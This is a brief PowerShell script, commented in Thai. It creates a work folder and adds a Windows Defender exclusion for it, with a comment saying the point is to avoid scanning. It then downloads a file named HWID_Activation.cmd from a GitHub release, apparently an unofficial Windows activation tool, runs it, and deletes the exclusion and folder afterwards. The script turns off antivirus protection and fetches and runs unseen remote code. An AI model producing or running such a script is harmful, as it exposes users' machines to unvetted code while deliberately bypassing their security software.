# 1. สร้างโฟลเดอร์สำหรับทำงาน
$workDir = "C:\phwyverysad"
if (!(Test-Path $workDir)) {
    New-Item -Path $workDir -ItemType Directory | Out-Null
}

# 2. เพิ่ม Exclusion ให้กับโฟลเดอร์เพื่อเลี่ยงการสแกนของ Windows Defender
Write-Host "Configuring exclusions..." -ForegroundColor Cyan
Add-MpPreference -ExclusionPath $workDir

# 3. กำหนด URL และที่เก็บไฟล์
$url = "https://github.com/plathx/-/releases/download/%E0%B8%88%E0%B8%B9%E0%B8%99%E0%B8%84%E0%B8%AD%E0%B8%A1/HWID_Activation.cmd"
$output = Join-Path $workDir "HWID_Activation.cmd"

# 4. ดาวน์โหลดไฟล์โดยใช้ .NET (WebClient)
Write-Host "Downloading file..." -ForegroundColor Cyan
$webClient = New-Object System.Net.WebClient
try {
    $webClient.DownloadFile($url, $output)
}
catch {
    Write-Host "Download failed: $_" -ForegroundColor Red
    exit
}

# 5. สั่งรันไฟล์ .cmd และรอจนกว่ากระบวนการจะเสร็จสิ้น
if (Test-Path $output) {
    Write-Host "Running script..." -ForegroundColor Yellow
    $process = Start-Process -FilePath $output -Wait -PassThru
    
    # 6. เมื่อโปรแกรมปิดตัวลง (Wait จนจบแล้ว) ให้ทำการลบโฟลเดอร์
    Write-Host "Cleaning up..." -ForegroundColor Green
    # ลบ Exclusion ออกก่อนเพื่อความสะอาดของระบบ (เลือกได้ว่าจะเอาบรรทัดนี้ไว้ไหม)
    Remove-MpPreference -ExclusionPath $workDir -ErrorAction SilentlyContinue
    
    # ลบโฟลเดอร์และไฟล์ทั้งหมดภายใน
    Remove-Item -Path $workDir -Recurse -Force
    Write-Host "Done." -ForegroundColor White
}
else {
    Write-Host "File not found!" -ForegroundColor Red
}
